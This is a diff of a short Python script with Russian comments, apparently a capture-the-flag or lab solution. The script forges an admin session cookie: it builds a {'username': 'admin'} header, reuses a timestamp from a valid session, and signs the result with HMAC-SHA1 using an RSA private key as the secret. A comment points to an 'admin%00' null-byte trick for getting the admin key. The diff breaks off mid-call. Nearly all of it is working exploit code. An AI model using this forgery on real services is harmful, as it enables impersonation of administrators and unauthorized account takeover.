@@ -2,27 +2,24 @@ import hmac
 import hashlib
 import base64
 
-# 1. Вставь сюда свой ПРИВАТНЫЙ КЛЮЧ (целиком, как на сайте)
+# !!! ВСТАВЬ СЮДА НОВЫЙ КЛЮЧ ИЗ ДАШБОРДА admin%00 !!!
 PRIVATE_KEY = """-----BEGIN PRIVATE KEY-----
-MIIBu... (ТУТ ТВОЙ ДЛИННЫЙ КЛЮЧ) ...
+MIIBu... (ВЕСЬ ТЕКСТ КЛЮЧА АДМИНА) ...
 -----END PRIVATE KEY-----"""
 
-# 2. Вставь сюда любую рабочую временную метку (из твоей куки - средняя часть)
-# Токен выглядит так: part1.part2.part3
-# part2 - это timestamp (например, "aZCbaw")
+# Вторая часть куки (timestamp) из твоего рабочего сеанса
 TIMESTAMP_PART = "aZCbaw" 
 
 def forge():
-    # Готовим заголовок для Админа
-    # {"username": "admin"} в Base64Url
+    # 1. Формируем чистый заголовок для admin
     header = b'{"username": "admin"}'
     part1 = base64.urlsafe_b64encode(header).decode().rstrip('=')
     
-    # Собираем данные: payload.timestamp
+    # 2. Собираем данные
     data_to_sign = f"{part1}.{TIMESTAMP_PART}"
 
-    # Подписываем (HMAC-SHA1), используя приватный ключ как пароль
-    # Это главная уязвимость: ключ RSA используется как строка-секрет
+    # 3. Подписываем ключом админа (HMAC-SHA1)
+    # Используем PRIVATE_KEY.strip() чтобы убрать лишние пробелы по краям
     signature = hmac.new(
         PRIVATE_KEY.strip().encode(), 
         data_to_sign.encode(), 
